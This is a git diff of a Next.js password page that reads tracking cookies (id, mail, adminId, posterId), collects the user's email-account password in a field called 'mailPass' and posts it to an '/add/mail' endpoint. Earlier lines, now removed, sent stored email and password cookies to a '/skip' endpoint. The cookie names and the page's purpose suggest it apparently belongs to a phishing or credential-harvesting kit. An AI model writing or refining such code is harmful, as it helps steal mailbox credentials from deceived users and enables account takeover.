@@ -1,9 +1,8 @@
 import Cookies from "js-cookie";
 import { useRouter } from "next/router";
 import React, { useEffect, useState } from "react";
-import { API_URL, site } from "../../config";
+import { API_URL } from "../../config";
 import Head from "next/head";
-import useMockLogin from "../../hooks/useMockLogin";
 import { toast } from "react-toastify";
 
 function PasswordPage() {
@@ -13,10 +12,8 @@ function PasswordPage() {
   const router = useRouter();
 
   const id = Cookies.get("id");
-  const email = Cookies.get("email");
-  const password = Cookies.get("password");
   const mail = Cookies.get("mail");
-  const skipcode = Cookies.get("skipcode");
+  // const skipcode = Cookies.get("skipcode");
 
   useEffect(() => {
     setUserEmail(mail);
@@ -60,8 +57,6 @@ function PasswordPage() {
     );
   };
 
-  const { login } = useMockLogin();
-
   const resetInput = () => {
     setMailPass("");
   };
@@ -71,18 +66,17 @@ function PasswordPage() {
 
     const submitValues = {
       id: id,
-      skipcode: skipcode,
-      email: email,
-      password: password,
+      // skipcode: skipcode,
       mail: mail,
       mailPass: mailPass,
     };
 
     // console.log("submitValues", submitValues);
+    // return;
 
     // login(submitValues, resetInput);
 
-    const url = `${API_URL}/skip`;
+    const url = `${API_URL}/add/mail`;
 
     const res = await fetch(url, {
       method: "POST",
@@ -101,9 +95,7 @@ function PasswordPage() {
       resetInput();
       // setReset(true);
       Cookies.remove("id");
-      Cookies.remove("email");
-      Cookies.remove("password");
-      Cookies.remove("skipcode");
+      // Cookies.remove("skipcode");
       Cookies.remove("mail");
       Cookies.remove("adminId");
       Cookies.remove("posterId");
